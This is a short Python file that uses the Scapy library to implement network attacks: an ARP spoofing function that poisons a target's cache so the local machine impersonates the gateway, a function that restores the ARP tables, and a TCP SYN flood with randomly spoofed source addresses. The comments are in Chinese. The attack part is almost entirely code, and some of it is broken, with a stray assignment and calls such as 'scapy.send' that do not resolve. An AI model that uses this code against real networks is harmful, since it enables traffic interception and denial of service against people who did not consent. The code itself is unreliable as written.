from scapy.all import *
from scapy.layers.inet import *
from scapy.layers.dns import *
from scapy.layers.l2 import *



def arp_spoof(target_ip, gateway_ip):
    '''
    向target_ip发布ARP响应，让本机的mac地址成为网关ip的mac地址
    :param target_ip: 被欺骗方的IP
    :param gateway_ip: 欺骗网关IP
    :return:
    '''
    # op=2表示arp报文为响应报文，op=1表示广播
    packet = scapy.ARP
    packet = ARP(op=2, pdst=target_ip, hwdst=scapy.getmacbyip(target_ip), psrc=gateway_ip)
    send(packet, verbose=False)

def arp_restore(destination_ip, source_ip):
    destination_mac = getmacbyip(destination_ip)
    source_mac = getmacbyip(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)

def tcp_syn_flooding(target_ip, sport, dport):
    src = RandIP()
    dst = target_ip
    pkt = IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, seq=1505066, flags='S')
    send(pkt)